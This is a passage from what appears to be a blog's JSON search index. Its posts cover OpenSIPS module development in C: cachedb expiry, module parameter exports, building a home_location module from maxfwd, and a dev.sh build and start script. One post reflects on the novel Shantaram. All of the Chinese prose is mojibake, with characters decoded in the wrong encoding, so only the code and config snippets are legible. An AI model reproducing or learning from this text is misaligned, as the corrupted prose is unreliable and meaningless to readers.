èº«ï¼Œæ­¥å±¥ç»´è‰°ï¼Œå±¡æ¬¡ä¸‰ç•ªæƒ³è¦æ”¾å¼ƒ\nç”Ÿå‘½ä¸æ¯ æŠ˜è…¾ä¸æ­¢ ä½¿ç”¨ubuntuä½œä¸ºä¸»åŠ›å¼€å‘å·¥å…·\nå…¶å®ï¼Œè¿™ç§å¥å­ä¹Ÿä¸æ˜¯æˆ‘çš„åŸåˆ›ã€‚æ˜¯æˆ‘ä»¿ç…§æˆ‘çœ‹è¿‡çš„ä¸€æœ¬å°è¯´ï¼Œä»ä¸­æ‘˜æŠ„è€Œæ¥ã€‚\nè¿™æœ¬å°è¯´å«åšã€Šé¡¹å¡”å…°ã€‹\næˆ‘èŠ±äº†å¾ˆé•¿çš„å²æœˆï¼Œèµ°è¿‡å¤§åŠä¸ªä¸–ç•Œï¼Œæ‰çœŸæ­£å­¦åˆ°ä»€ä¹ˆæ˜¯çˆ±ã€ä»€ä¹ˆæ˜¯å‘½è¿ï¼Œä»¥åŠæˆ‘ä»¬æ‰€åšçš„æŠ‰æ‹©ã€‚æˆ‘è¢«æ‹´åœ¨å¢™ä¸Šé­å—æ‹·æ‰“æ—¶ï¼Œæ‰é¡¿æ‚Ÿè¿™ä¸ªçœŸè°›ã€‚ä¸çŸ¥ä¸ºä½•ï¼Œå°±åœ¨æˆ‘å†…å¿ƒå‘å‡ºå‘å–Šä¹‹é™…ï¼Œæˆ‘æ„è¯†åˆ°ï¼Œå³ä½¿é•£é“åŠ èº«ï¼Œä¸€èº«è¡€æ±¡ï¼Œå­¤ç«‹æ— åŠ©ï¼Œæˆ‘ä»ç„¶æ˜¯è‡ªç”±ä¹‹èº«ï¼Œæˆ‘å¯ä»¥å†³å®šæ˜¯è¦ç—›æ¨æ‹·æ‰“æˆ‘çš„äººï¼Œè¿˜æ˜¯åŸè°…ä»–ä»¬ã€‚æˆ‘çŸ¥é“ï¼Œè¿™å¬èµ·æ¥ä¼¼ä¹ç®—ä¸äº†ä»€ä¹ˆï¼Œä½†åœ¨é•£é“åŠ èº«ã€ç—›è‹¦ä¸‡åˆ†çš„å½“ä¸‹ï¼Œå½“é•£é“æ˜¯ä½ å”¯ä¸€ä»…æœ‰çš„ï¼Œé‚£ä»½è‡ªç”±å°†å¸¦ç»™ä½ æ— é™çš„å¸Œæœ›ã€‚æ˜¯è¦ç—›æ¨ï¼Œè¿˜æ˜¯è¦åŸè°…ï¼Œè¿™æŠ‰æ‹©è¶³ä»¥å†³å®šäººä¸€ç”Ÿçš„é™…é‡ã€‚ã€Šé¡¹å¡”å…°ã€‹\nè¿™æ˜¯ä¸€åé€šç¼‰çŠ¯çš„åå¹´å°åº¦æµäº¡å²æœˆçš„è®°å½•ï¼Œå¾ˆéš¾æƒ³è±¡ï¼Œä¸€ååœ¨é€ƒçŠ¯æ˜¯å¦‚ä½•å†™å‡ºå¦‚æ­¤ä¼˜ç§€çš„æ–‡ç¬”ã€‚å„ä½çœ‹å®˜æœ‰æ—¶é—´å¯ä»¥çœ‹çœ‹ã€‚\nå‚è€ƒ https://mp.weixin.qq.com/s/9kfGCXevO5Hlpg_iINof6Q ","title":"å…³äºä¸­ç§‘é™¢å›ä¿¡æ–‡å­—çš„è”æƒ³"},{"content":"åº•å±‚å¯ç”¨ local ç¼“å­˜å­˜åœ¨æœ¬åœ°ï¼Œé€Ÿåº¦å¿«ï¼Œä½†æ˜¯å¤šå®ä¾‹æ— æ³•å…±äº«ï¼Œé‡å¯åæ¶ˆå¤± redis ç¼“å­˜å­˜åœ¨redis, å¤šå®ä¾‹å¯ä»¥å…±äº«ï¼Œé‡å¯åä¸æ¶ˆå¤± æ¥å£ store -cache_store() å­˜å‚¨ fetch -cache_fetch() è·å– remove -cache_remove() åˆ é™¤ add -cache_add() é€’å¢ sub -cache_sub() é€’å‡ cache_counter_fetch è·å–æŸä¸ªkeyçš„å€¼ å…³äºè¿‡æœŸçš„å•ä½ è™½ç„¶æ–‡æ¡£ä¸Šæ²¡æœ‰æ˜è¯´ï¼Œä½†æ˜¯è¿‡æœŸçš„å•ä½éƒ½æ˜¯ç§’ã€‚\ncachedb_localè¿‡æœŸ loadmodule \u0026#34;cachedb_local.so\u0026#34; modparam(\u0026#34;cachedb_local\u0026#34;, \u0026#34;cachedb_url\u0026#34;, \u0026#34;local://\u0026#34;) modparam(\u0026#34;cachedb_local\u0026#34;, \u0026#34;cache_clean_period\u0026#34;, 600) route[xxx]{ cache_add(\u0026#34;local\u0026#34;, \u0026#34;$fu\u0026#34;, 100, 5); } å‡å¦‚è¯´ï¼šåœ¨5ç§’ä¹‹å†…ï¼ŒåŒä¸€ä¸ª$fuæ¥äº†å¤šä¸ªè¯·æ±‚ï¼Œåœ¨è®¾ç½®è¿™ä¸ª$fuå€¼çš„æ—¶å€™ï¼Œè®¡æ—¶å™¨æ˜¯ä¸ä¼šé‡ç½®çš„ã€‚è¿‡æœŸçš„è®¡æ—¶å™¨è¿˜æ˜¯ç¬¬ä¸€æ¬¡çš„è®¾ç½®çš„é‚£ä¸ªæ—¶é—´ç‚¹å¼€å§‹è®¡æ—¶ã€‚\nå‚è€ƒ https://www.opensips.org/Documentation/Tutorials-KeyValueInterface ","permalink":"https://wdd.js.org/opensips/ch6/cachedb/","summary":"åº•å±‚å¯ç”¨ local ç¼“å­˜å­˜åœ¨æœ¬åœ°ï¼Œé€Ÿåº¦å¿«ï¼Œä½†æ˜¯å¤šå®ä¾‹æ— æ³•å…±äº«ï¼Œé‡å¯åæ¶ˆå¤± redis ç¼“å­˜å­˜åœ¨redis, å¤šå®ä¾‹å¯ä»¥å…±äº«ï¼Œé‡å¯åä¸æ¶ˆå¤± æ¥å£ store -cache_store() å­˜å‚¨ fetch -cache_fetch() è·å– remove -cache_remove() åˆ é™¤ add -cache_add() é€’å¢ sub -cache_sub() é€’å‡ cache_counter_fetch è·å–æŸä¸ªkeyçš„å€¼ å…³äºè¿‡æœŸçš„å•ä½ è™½ç„¶æ–‡æ¡£ä¸Šæ²¡æœ‰æ˜è¯´ï¼Œä½†æ˜¯è¿‡æœŸçš„å•ä½éƒ½æ˜¯ç§’ã€‚\ncachedb_localè¿‡æœŸ loadmodule \u0026#34;cachedb_local.so\u0026#34; modparam(\u0026#34;cachedb_local\u0026#34;, \u0026#34;cachedb_url\u0026#34;, \u0026#34;local://\u0026#34;) modparam(\u0026#34;cachedb_local\u0026#34;, \u0026#34;cache_clean_period\u0026#34;, 600) route[xxx]{ cache_add(\u0026#34;local\u0026#34;, \u0026#34;$fu\u0026#34;, 100, 5); } å‡å¦‚è¯´ï¼šåœ¨5ç§’ä¹‹å†…ï¼ŒåŒä¸€ä¸ª$fuæ¥äº†å¤šä¸ªè¯·æ±‚ï¼Œåœ¨è®¾ç½®è¿™ä¸ª$fuå€¼çš„æ—¶å€™ï¼Œè®¡æ—¶å™¨æ˜¯ä¸ä¼šé‡ç½®çš„ã€‚è¿‡æœŸçš„è®¡æ—¶å™¨è¿˜æ˜¯ç¬¬ä¸€æ¬¡çš„è®¾ç½®çš„é‚£ä¸ªæ—¶é—´ç‚¹å¼€å§‹è®¡æ—¶ã€‚\nå‚è€ƒ https://www.opensips.org/Documentation/Tutorials-KeyValueInterface ","title":"cachedbçš„ç›¸å…³é—®é¢˜"},{"content":"æ¨¡å—ä¼ å‚æœ‰ä¸¤ç§ç±»å‹\nç›´æ¥èµ‹å€¼ä¼ å‚ é—´æ¥å‡½æ•°è°ƒç”¨ä¼ å‚ str local_zone_code = {\u0026#34;\u0026#34;,0}; int some_int_param = 0; static param_export_t params[]={ // ç›´æ¥å­—ç¬¦ä¸²èµ‹å€¼ {\u0026#34;local_zone_code\u0026#34;, STR_PARAM, \u0026amp;local_zone_code.s}, // ç›´æ¥æ•´æ•°èµ‹å€¼ {\u0026#34;some_int_param\u0026#34;, INT_PARAM, \u0026amp;some_int_param}, // å‡½æ•°è°ƒç”¨ å­—ç¬¦çªœ {\u0026#34;zone_code_map\u0026#34;, STR_PARAM|USE_FUNC_PARAM, (void *)\u0026amp;set_code_zone_map}, // å‡½æ•°è°ƒç”¨ æ•´æ•° {\u0026#34;zone_code_map_int\u0026#34;, INT_PARAM|USE_FUNC_PARAM, (void *)\u0026amp;set_code_zone_map_int}, {0,0,0} }; ä½¿ç”¨å‡½æ•°å¤„ç†å‚æ•°çš„å¥½å¤„æ˜¯ï¼Œå¯ä»¥å¯¹å‚æ•°åšæ›´å¤æ‚çš„å¤„ç†ã€‚\nä¾‹å¦‚ï¼š\næŸä¸ªå‚æ•°å¯ä»¥å¤šæ¬¡ä¼ é€’ å¯¹å‚æ•°è¿›è¡Œæ ¡éªŒï¼Œåœ¨å¯åŠ¨å‰å°±å¯ä»¥åˆ¤æ–­ä¼ å‚æ˜¯å¦æœ‰é—®é¢˜ã€‚ static int set_code_zone_map(unsigned int type, void *val) { LM_INFO(\u0026#34;set_zone_code_map type:%d val:%s \\n\u0026#34;,type,(char *)val); return 1; } ","permalink":"https://wdd.js.org/opensips/module-dev/l4-1/","summary":"æ¨¡å—ä¼ å‚æœ‰ä¸¤ç§ç±»å‹\nç›´æ¥èµ‹å€¼ä¼ å‚ é—´æ¥å‡½æ•°è°ƒç”¨ä¼ å‚ str local_zone_code = {\u0026#34;\u0026#34;,0}; int some_int_param = 0; static param_export_t params[]={ // ç›´æ¥å­—ç¬¦ä¸²èµ‹å€¼ {\u0026#34;local_zone_code\u0026#34;, STR_PARAM, \u0026amp;local_zone_code.s}, // ç›´æ¥æ•´æ•°èµ‹å€¼ {\u0026#34;some_int_param\u0026#34;, INT_PARAM, \u0026amp;some_int_param}, // å‡½æ•°è°ƒç”¨ å­—ç¬¦çªœ {\u0026#34;zone_code_map\u0026#34;, STR_PARAM|USE_FUNC_PARAM, (void *)\u0026amp;set_code_zone_map}, // å‡½æ•°è°ƒç”¨ æ•´æ•° {\u0026#34;zone_code_map_int\u0026#34;, INT_PARAM|USE_FUNC_PARAM, (void *)\u0026amp;set_code_zone_map_int}, {0,0,0} }; ä½¿ç”¨å‡½æ•°å¤„ç†å‚æ•°çš„å¥½å¤„æ˜¯ï¼Œå¯ä»¥å¯¹å‚æ•°åšæ›´å¤æ‚çš„å¤„ç†ã€‚\nä¾‹å¦‚ï¼š\næŸä¸ªå‚æ•°å¯ä»¥å¤šæ¬¡ä¼ é€’ å¯¹å‚æ•°è¿›è¡Œæ ¡éªŒï¼Œåœ¨å¯åŠ¨å‰å°±å¯ä»¥åˆ¤æ–­ä¼ å‚æ˜¯å¦æœ‰é—®é¢˜ã€‚ static int set_code_zone_map(unsigned int type, void *val) { LM_INFO(\u0026#34;set_zone_code_map type:%d val:%s \\n\u0026#34;,type,(char *)val); return 1; } ","title":"ch4-1 USE_FUNC_PARAMå‚æ•°ç±»å‹"},{"content":"æœ¬ç« èŠ‚ï¼Œå¸¦é¢†å¤§å®¶æ¢ç´¢opensipsæ¨¡å—å¼€å‘ã€‚å¸Œæœ›æ·±å…¥äº†è§£opensipsçš„åŒå­¦å¯ä»¥çœ‹çœ‹ã€‚\nå†…å®¹æ¶µç›– ç« èŠ‚çš„å†…å®¹å°†ä¼šæ¶µç›–\nopensipsçš„å¯åŠ¨æµç¨‹ å¦‚ä½•åˆ›å»ºä¸€ä¸ªæ¨¡å— å¦‚ä½•ç»™æ¨¡å—ä¼ é€’å‚æ•° æ¨¡å—çš„ç”Ÿå‘½å‘¨æœŸå‡½æ•°çš„å¤„ç† å¦‚ä½•æš´éœ²è‡ªå®šä¹‰çš„å‡½æ•° å¦‚ä½•æ£€æŸ¥å‡½æ•°çš„ä¼ æƒ¨ å¦‚ä½•è·å–$varæˆ–è€…$avpå˜é‡ å¦‚ä½•è·å–ç›¸å…³çš„flag å¦‚ä½•ä¿®æ”¹SIPæ¶ˆæ¯ å¦‚ä½•ç¼–å†™miæ¥å£ å¦‚ä½•ç¼–å†™statisticsç»Ÿè®¡æ•°æ® å¦‚ä½•åšæ•°æ®åº“æ“ä½œ OpenSIPSæ¶æ„ å‚è€ƒ https://voipmagazine.files.wordpress.com/2014/09/opensips-arch.jpg ","permalink":"https://wdd.js.org/opensips/module-dev/l1/","summary":"æœ¬ç« èŠ‚ï¼Œå¸¦é¢†å¤§å®¶æ¢ç´¢opensipsæ¨¡å—å¼€å‘ã€‚å¸Œæœ›æ·±å…¥äº†è§£opensipsçš„åŒå­¦å¯ä»¥çœ‹çœ‹ã€‚\nå†…å®¹æ¶µç›– ç« èŠ‚çš„å†…å®¹å°†ä¼šæ¶µç›–\nopensipsçš„å¯åŠ¨æµç¨‹ å¦‚ä½•åˆ›å»ºä¸€ä¸ªæ¨¡å— å¦‚ä½•ç»™æ¨¡å—ä¼ é€’å‚æ•° æ¨¡å—çš„ç”Ÿå‘½å‘¨æœŸå‡½æ•°çš„å¤„ç† å¦‚ä½•æš´éœ²è‡ªå®šä¹‰çš„å‡½æ•° å¦‚ä½•æ£€æŸ¥å‡½æ•°çš„ä¼ æƒ¨ å¦‚ä½•è·å–$varæˆ–è€…$avpå˜é‡ å¦‚ä½•è·å–ç›¸å…³çš„flag å¦‚ä½•ä¿®æ”¹SIPæ¶ˆæ¯ å¦‚ä½•ç¼–å†™miæ¥å£ å¦‚ä½•ç¼–å†™statisticsç»Ÿè®¡æ•°æ® å¦‚ä½•åšæ•°æ®åº“æ“ä½œ OpenSIPSæ¶æ„ å‚è€ƒ https://voipmagazine.files.wordpress.com/2014/09/opensips-arch.jpg ","title":"ch1 å¼€å‘è¯¾ç¨‹ç®€ä»‹"},{"content":"å¼€å§‹ æˆ‘ä»¬éœ€è¦ç»™home_locationæ¨¡å—å¢åŠ ä¸€ä¸ªå‚æ•°ï¼Œé…ç½®å½“åœ°çš„å·ç åŒºå·\né¦–å…ˆï¼Œæˆ‘ä»¬åˆ é™¤maxfwd.cæ–‡ä»¶ä¸­å¼€å¤´çš„å¾ˆå¤šæ³¨é‡Šï¼Œæˆ‘ä»¬å…ˆæŠŠæ³¨æ„åŠ›é›†ä¸­åœ¨ä»£ç ä¸Šã€‚\nåˆ é™¤äº†30å¤šè¡Œæ³¨é‡Šï¼Œä»£ç è¿˜å‰©160å¤šè¡Œã€‚\né¦–å…ˆæˆ‘ä»¬ä¸€ä¸ªå˜é‡ï¼Œç”¨æ¥ä¿å­˜æœ¬åœ°çš„åŒºå·ã€‚è¿™ä¸ªå˜é‡æ˜¯ä¸ªstrç±»å‹ã€‚\nstr local_zone_code = {\u0026#34;\u0026#34;,0}; str å…³äºstrç±»å‹ï¼Œå¯ä»¥å‚è€ƒopensips/str.hå¤´æ–‡ä»¶ã€‚\nstruct __str { char* s; /**\u0026lt; string as char array */ int len; /**\u0026lt; string length, not including null-termination */ }; typedef struct __str str; å®é™…ä¸Šï¼Œstræ˜¯ä¸ªæŒ‡å‘__strç»“æ„ä½“ï¼Œå¯ä»¥çœ‹å‡ºè¿™ä¸ªç»“æ„ä½“æœ‰æŒ‡å‘å­—ç¬¦ä¸²çš„char*ç±»å‹çš„æŒ‡é’ˆï¼Œä»¥åŠä¸€ä¸ªä»£è¡¨å­—ç¬¦ä¸²é•¿åº¦çš„lenå±æ€§ã€‚è¿™æ ·åšçš„å¥½å¤„æ˜¯å¯ä»¥é«˜æ•ˆçš„è·å–å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œå¾ˆå¤šæœ‰åçš„å¼€æºé¡¹ç›®éƒ½æœ‰ç±»ä¼¼çš„ç»“æ„ä½“ã€‚\nopensipså‡ ä¹æ‰€æœ‰çš„å­—ç¬¦ä¸²éƒ½æ˜¯ç”¨çš„strç±»å‹\nparam_export_t param_export_tè¿™ä¸ªç»“æ„ä½“æ˜¯ç”¨æ¥é€šè¿‡è„šæœ¬é‡Œé¢çš„modparamå‘æ¨¡å—ä¼ é€’å‚æ•°çš„ã€‚è¿™ä¸ªæ•°ç»„æœ€åä¸€å‘æ˜¯{0,0,0} è¿™æœ€åä¸€é¡¹å…¶å®æ˜¯ä¸ªæ ‡å¿—ï¼Œæ ‡å¿—ç€æ•°ç»„çš„ç»“æŸã€‚\nstatic param_export_t params[]={ {\u0026#34;max_limit\u0026#34;, INT_PARAM, \u0026amp;max_limit}, {\u0026#34;local_zone_code\u0026#34;, STR_PARAM, \u0026amp;local_zone_code.s}, {0,0,0} }; åœ¨sr_module_deps.hå’Œsr_module.hä¸­æœ‰ä¸‹é¢çš„ä»£ç \ntypedef struct param_export_ param_export_t; param_export_tå®é™…ä¸Šæ˜¯æŒ‡å‘param_export_è¿™ä¸ªç»“æ„ä½“ã€‚\nè¿™ä¸ªç»“æ„ä½“æœ‰ä¸‰ä¸ªå‚æ•°\nname è¡¨ç¤ºå‚æ•°çš„åç§° modparam_t è¡¨ç¤ºå‚æ•°çš„ç±»å‹ã€‚å‚æ•°ç±»å‹æœ‰ä»¥ä¸‹å‡ ç§ STR_PARAM å­—ç¬¦ä¸²ç±»å‹ INT_PARAM æ•´æ•°ç±»å‹ USE_FUNC_PARAM å‡½æ•°ç±»å‹ PARAM_TYPE_MASK è¿™ä¸ªç”¨åˆ°çš„æ—¶å€™å†è¯´ param_pointer æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œç”¨åˆ°çš„æ—¶å€™å†å…·ä½“è¯´æ˜ struct param_export_ { char* name; /*!\u0026lt; null terminated param. name */ modparam_t type; /*!\u0026lt; param. type */ void* param_pointer; /*!\u0026lt; pointer to the param. memory location */ }; #define STR_PARAM (1U\u0026lt;\u0026lt;0) /* String parameter type */ #define INT_PARAM (1U\u0026lt;\u0026lt;1) /* Integer parameter type */ #define USE_FUNC_PARAM (1U\u0026lt;\u0026lt;(8*sizeof(int)-1)) #define PARAM_TYPE_MASK(_x) ((_x)\u0026amp;(~USE_FUNC_PARAM)) typedef unsigned int modparam_t; å›è¿‡å¤´æ¥ï¼Œçœ‹çœ‹local_zone_codeè¿™ä¸ªå‚æ•°çš„é…ç½®ï¼Œæ˜¯ä¸æ˜¯å°±éå¸¸æ˜ç¡®äº†å‘€\n{\u0026#34;local_zone_code\u0026#34;, STR_PARAM, \u0026amp;local_zone_code.s}, æ¥ç€ï¼Œä½ å¯èƒ½ä¼šé—®ï¼ŒåŠ å…¥æˆ‘ä»¬é…ç½®å¥½äº†è¿™ä¸ªå‚æ•°ï¼Œå¦‚ä½•å†è¿è¡Œçš„æ—¶å€™å°†local_zone_codeè¿™ä¸ªå˜é‡çš„å€¼æ‰“å°å‡ºæ¥å‘¢ï¼Ÿ\nå†module_exportsè¿™ä¸ªç»“æ„ä½“é‡Œé¢ï¼Œæœ€åçš„å‡ ä¸ªå‚æ•°å®é™…ä¸Šæ˜¯ä¸€ä¸ªå‡½æ•°ã€‚\nè¿™äº›å‡½æ•°å†æ¨¡å—çš„ç”Ÿå‘½å‘¨æœŸå†…ä¼šè°ƒç”¨ã€‚æ¯”å¦‚é‚£ä¸ªmod_init, å°±æ˜¯æ¨¡å—åˆå§‹åŒ–çš„æ—¶å€™å°±ä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚\né‚£ä¹ˆï¼Œæˆ‘ä»¬å°±åœ¨æ¨¡å—åˆå§‹åŒ–çš„æ—¶å€™æ‰“å°local_zone_codeçš„å€¼å¥½äº†ã€‚\nä¸‹é¢çš„ä»£ç ï¼Œæˆ‘ä»¬å…¶å®åªæ’å…¥äº†ä¸€è¡Œ, LM_INFO, ç”¨æ¥æ‰“å°ã€‚å…¶ä»–å°±ä¿æŒåŸæ ·å¥½äº†ã€‚\nmod_initå‡½æ•°çš„è¿”å›å€¼æ˜¯æœ‰ç‰¹æ®Šå«ä¹‰çš„ï¼Œå¦‚æœè¿”å›æ˜¯0ï¼Œè¡¨ç¤ºæˆåŠŸã€‚å¦‚æœè¿”å›çš„æ˜¯è´Ÿæ•°, ä¾‹å¦‚E_CFG, è¿™æ—¶å€™opensipså°±ä¼šè®¤ä¸ºä½ çš„è„šæœ¬å†™çš„æœ‰é—®é¢˜ï¼Œå°±ä¸ä¼šç»§ç»­å¯åŠ¨opensipsã€‚\nstatic int mod_init(void) { LM_INFO(\u0026#34;initializing...\\n\u0026#34;); LM_INFO(\u0026#34;Initializing local_zone_code: %s\\n\u0026#34;, local_zone_code.s); if ( max_limit\u0026lt;1 || max_limit\u0026gt;MAXFWD_UPPER_LIMIT ) { LM_ERR(\u0026#34;invalid max limit (%d) [1,%d]\\n\u0026#34;, max_limit,MAXFWD_UPPER_LIMIT); return E_CFG; } return 0; } å†error.hä¸­ï¼Œå¯ä»¥çœ‹åˆ°opensipså®šä¹‰äº†å¾ˆå¤šçš„é”™è¯¯ç ã€‚\nç¼–è¯‘æ¨¡å— æºç çš„cæ–‡ä»¶æˆ‘ä»¬ä¿®æ”¹å¥½äº†ï¼Œä¸‹é¢å°±æ˜¯ç¼–è¯‘å®ƒï¼Œä¸çŸ¥é“ä¼šä¸ä¼šæŠ¥é”™å‘¢ï¼ŸğŸ˜‚\nâœ home_location git:(home_location) âœ— ./dev.sh build /root/code/gitee/opensips make[1]: Entering directory \u0026#39;/root/code/gitee/opensips/modules/home_location\u0026#39; Compiling maxfwd.c Linking home_location.so make[1]: Leaving directory \u0026#39;/root/code/gitee/opensips/modules/home_location\u0026#39; ä¼¼ä¹æ²¡å•¥é—®é¢˜\nç¼–è¾‘dev.cfg å¢åŠ local_zone_codeå‚æ•° loadmodule \u0026#34;/root/code/gitee/opensips/modules/home_location/home_location.so\u0026#34; + modparam(\u0026#34;home_location\u0026#34;, \u0026#34;local_zone_code\u0026#34;, \u0026#34;010\u0026#34;) ./dev.sh start çœ‹çœ‹log.txt, local_zone_codeå·²ç»è¢«æ‰“å°å‡ºæ¥ï¼Œå¹¶ä¸”ä»–çš„å€¼æ˜¯æˆ‘ä»¬åœ¨cfgè„šæœ¬é‡Œé…ç½®çš„010ã€‚\n~ Apr 21 13:47:40 [1048372] INFO:home_location:mod_init: initializing... ~ Apr 21 13:47:40 [1048372] INFO:home_location:mod_init: Initializing local_zone_code: 010 ok, ç¬¬ä¸‰ç« ç»“æŸã€‚\n","permalink":"https://wdd.js.org/opensips/module-dev/l4/","summary":"å¼€å§‹ æˆ‘ä»¬éœ€è¦ç»™home_locationæ¨¡å—å¢åŠ ä¸€ä¸ªå‚æ•°ï¼Œé…ç½®å½“åœ°çš„å·ç åŒºå·\né¦–å…ˆï¼Œæˆ‘ä»¬åˆ é™¤maxfwd.cæ–‡ä»¶ä¸­å¼€å¤´çš„å¾ˆå¤šæ³¨é‡Šï¼Œæˆ‘ä»¬å…ˆæŠŠæ³¨æ„åŠ›é›†ä¸­åœ¨ä»£ç ä¸Šã€‚\nåˆ é™¤äº†30å¤šè¡Œæ³¨é‡Šï¼Œä»£ç è¿˜å‰©160å¤šè¡Œã€‚\né¦–å…ˆæˆ‘ä»¬ä¸€ä¸ªå˜é‡ï¼Œç”¨æ¥ä¿å­˜æœ¬åœ°çš„åŒºå·ã€‚è¿™ä¸ªå˜é‡æ˜¯ä¸ªstrç±»å‹ã€‚\nstr local_zone_code = {\u0026#34;\u0026#34;,0}; str å…³äºstrç±»å‹ï¼Œå¯ä»¥å‚è€ƒopensips/str.hå¤´æ–‡ä»¶ã€‚\nstruct __str { char* s; /**\u0026lt; string as char array */ int len; /**\u0026lt; string length, not including null-termination */ }; typedef struct __str str; å®é™…ä¸Šï¼Œstræ˜¯ä¸ªæŒ‡å‘__strç»“æ„ä½“ï¼Œå¯ä»¥çœ‹å‡ºè¿™ä¸ªç»“æ„ä½“æœ‰æŒ‡å‘å­—ç¬¦ä¸²çš„char*ç±»å‹çš„æŒ‡é’ˆï¼Œä»¥åŠä¸€ä¸ªä»£è¡¨å­—ç¬¦ä¸²é•¿åº¦çš„lenå±æ€§ã€‚è¿™æ ·åšçš„å¥½å¤„æ˜¯å¯ä»¥é«˜æ•ˆçš„è·å–å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œå¾ˆå¤šæœ‰åçš„å¼€æºé¡¹ç›®éƒ½æœ‰ç±»ä¼¼çš„ç»“æ„ä½“ã€‚\nopensipså‡ ä¹æ‰€æœ‰çš„å­—ç¬¦ä¸²éƒ½æ˜¯ç”¨çš„strç±»å‹\nparam_export_t param_export_tè¿™ä¸ªç»“æ„ä½“æ˜¯ç”¨æ¥é€šè¿‡è„šæœ¬é‡Œé¢çš„modparamå‘æ¨¡å—ä¼ é€’å‚æ•°çš„ã€‚è¿™ä¸ªæ•°ç»„æœ€åä¸€å‘æ˜¯{0,0,0} è¿™æœ€åä¸€é¡¹å…¶å®æ˜¯ä¸ªæ ‡å¿—ï¼Œæ ‡å¿—ç€æ•°ç»„çš„ç»“æŸã€‚\nstatic param_export_t params[]={ {\u0026#34;max_limit\u0026#34;, INT_PARAM, \u0026amp;max_limit}, {\u0026#34;local_zone_code\u0026#34;, STR_PARAM, \u0026amp;local_zone_code.s}, {0,0,0} }; åœ¨sr_module_deps.hå’Œsr_module.hä¸­æœ‰ä¸‹é¢çš„ä»£ç \ntypedef struct param_export_ param_export_t; param_export_tå®é™…ä¸Šæ˜¯æŒ‡å‘param_export_è¿™ä¸ªç»“æ„ä½“ã€‚\nè¿™ä¸ªç»“æ„ä½“æœ‰ä¸‰ä¸ªå‚æ•°\nname è¡¨ç¤ºå‚æ•°çš„åç§° modparam_t è¡¨ç¤ºå‚æ•°çš„ç±»å‹ã€‚å‚æ•°ç±»å‹æœ‰ä»¥ä¸‹å‡ ç§ STR_PARAM å­—ç¬¦ä¸²ç±»å‹ INT_PARAM æ•´æ•°ç±»å‹ USE_FUNC_PARAM å‡½æ•°ç±»å‹ PARAM_TYPE_MASK è¿™ä¸ªç”¨åˆ°çš„æ—¶å€™å†è¯´ param_pointer æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œç”¨åˆ°çš„æ—¶å€™å†å…·ä½“è¯´æ˜ struct param_export_ { char* name; /*!","title":"ch4 é…ç½®æ¨¡å—çš„å¯åŠ¨å‚æ•°"},{"content":"ä»å¤´å†™ä¸€ä¸ªæ¨¡å—æ˜¯æ¯”è¾ƒéº»çƒ¦çš„ï¼Œæˆ‘ä»¬å¯ä»¥åŸºäºä¸€ä¸ªç®€å•çš„æ¨¡å—ï¼Œç„¶ååœ¨è¿™ä¸ªæ¨¡å—ä¸Šè¿›è¡Œä¸€äº›ä¿®æ”¹ã€‚\næˆ‘ä»¬åŸºäºmaxfwdè¿™ä¸ªæ¨¡å—ï¼Œå¤åˆ¶ä¸€ä¸ªæ¨¡å—ï¼Œå«åšhome_locationã€‚\nä¸ºä»€ä¹ˆå«åšhome_locationå‘¢ï¼Ÿå› ä¸ºæˆ‘æƒ³æ ¹æ®ä¸€ä¸ªæ‰‹æœºå·ï¼ŒæŸ¥å‡ºå®ƒçš„å½’å±åœ°ï¼Œç„¶åæ ¹æ®å½“åœ°çš„å½’å±åœ°ï¼Œåˆ¤æ–­å·ç å‰è¦ä¸è¦åŠ 0\ncd modules cp -R maxfwd home_location âœ home_location git:(home_location) âœ— ll total 300K drwxr-xr-x 2 root root 4.0K Apr 20 13:56 doc -rw-r--r-- 1 root root 217 Apr 20 14:00 Makefile -rw-r--r-- 1 root root 4.7K Apr 20 14:00 maxfwd.c -rw-r--r-- 1 root root 2.0K Apr 20 13:56 maxfwd.d -rw-r--r-- 1 root root 77K Apr 20 13:56 maxfwd.o -rwxr-xr-x 1 root root 93K Apr 20 13:56 maxfwd.so -rw-r--r-- 1 root root 4.0K Apr 20 13:56 mf_funcs.c -rw-r--r-- 1 root root 2.1K Apr 20 13:56 mf_funcs.d -rw-r--r-- 1 root root 1.2K Apr 20 13:56 mf_funcs.h -rw-r--r-- 1 root root 84K Apr 20 13:56 mf_funcs.o -rw-r--r-- 1 root root 7.0K Apr 20 13:56 README ä¸‹é¢çš„æ“ä½œéƒ½æ˜¯æ“ä½œhome_locationç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚\nä¿®æ”¹Makefile NAMEæ”¹ä¸ºhome_location.so\nNAME=home_location.so ä¿®æ”¹maxfwd.c module_exportsçš„ç»“æ„ä½“çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ”¹ä¸ºhome_location ç¼–è¯‘home_locationæ¨¡å— ä¸Šé¢çš„æ“ä½œï¼Œå…¶å®åªæ˜¯ç»™maxfwdæ¨¡å—æ”¹äº†ä¸ªåå­—ï¼Œæ²¡æœ‰ä¿®æ”¹ä»»ä½•å…·ä½“ä»£ç ã€‚\næˆ‘ä»¬åœ¨home_locationç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªdev.shè„šæœ¬æ–‡ä»¶ï¼Œç”¨æ¥åšä¸€äº›å¿«é€Ÿèµ·åœï¼Œæˆ–è€…ç¼–è¯‘æ¨¡å—çš„äº‹é¡¹\ndev.sh #!/bin/bash case $1 in build) cd ../../ pwd; make modules modules=modules/home_location ;; start) killall opensips ulimit -t unlimited sleep 1 /usr/local/sbin/opensips -f ./dev.cfg -w . \u0026amp;\u0026gt; log.txt \u0026amp; echo $? ;; stop) killall opensips echo stop ;; *) echo bad;; esac chmod +x dev.sh # ç”¨æ¥ç¼–è¯‘home_locationæ¨¡å— ./dev.sh build # ç”¨æ¥å¯åŠ¨opensips, å¯åŠ¨opensipsä¹‹åï¼Œè¾“å‡ºçš„æ—¥å¿—ä¼šå†™åˆ°log.txtæ–‡ä»¶ä¸­ï¼Œ ./dev.sh start # ç”¨æ¥åœæ­¢opensips ./dev.sh stop dev.cfg 